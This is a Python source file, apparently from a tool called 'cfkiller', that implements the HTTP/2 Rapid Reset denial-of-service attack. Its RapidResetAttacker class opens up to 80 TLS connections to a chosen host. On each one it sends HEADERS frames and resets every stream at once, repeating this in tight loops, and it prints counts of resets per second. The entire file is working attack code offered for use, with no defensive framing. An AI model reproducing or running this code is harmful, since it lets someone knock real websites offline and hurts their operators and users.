# cfkiller/core/http2/rapid_reset.py
import asyncio
import ssl
import h2.connection
import h2.events
from typing import Optional
import time
from dataclasses import dataclass

@dataclass
class RapidResetStats:
    sent: int = 0
    reset: int = 0
    errors: int = 0
    start_time: float = 0.0

    @property
    def rps(self) -> float:
        elapsed = time.time() - self.start_time
        return self.reset / elapsed if elapsed > 0 else 0.0

class RapidResetAttacker:
    def __init__(
        self,
        host: str,
        port: int = 443,
        intensity: int = 1500,
        max_connections: int = 80,
        duration: int = 60
    ):
        self.host = host
        self.port = port
        self.intensity = intensity
        self.max_connections = max_connections
        self.duration = duration
        self.stats = RapidResetStats()
        self.stats.start_time = time.time()

    async def _create_h2_connection(self):
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["h2"])

        reader, writer = await asyncio.open_connection(
            self.host, self.port, ssl=ctx, server_hostname=self.host
        )

        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()
        return writer, conn

    async def _worker(self):
        try:
            writer, conn = await self._create_h2_connection()
            end_time = time.time() + self.duration

            while time.time() < end_time:
                for _ in range(self.intensity):
                    try:
                        stream_id = conn.get_next_available_stream_id()
                        headers = [
                            (':method', 'GET'),
                            (':path', '/'),
                            (':authority', self.host),
                            (':scheme', 'https'),
                        ]
                        conn.send_headers(headers, stream_id, end_stream=False)
                        self.stats.sent += 1

                        conn.reset_stream(stream_id)
                        self.stats.reset += 1

                        data = conn.data_to_send()
                        if data:
                            writer.write(data)
                            await writer.drain()

                    except (h2.exceptions.ProtocolError, BrokenPipeError, OSError):
                        break

                await asyncio.sleep(0.00001)

            writer.close()
            await writer.wait_closed()

        except Exception:
            self.stats.errors += 1

    async def attack(self):
        print(f"[RapidReset] Atacando {self.host} × {self.max_connections} conexiones")
        tasks = [self._worker() for _ in range(self.max_connections)]
        await asyncio.gather(*tasks, return_exceptions=True)

        print(f"\n[FIN] {self.stats.reset:,} RST_STREAM enviados → {self.stats.rps:,.0f} RPS")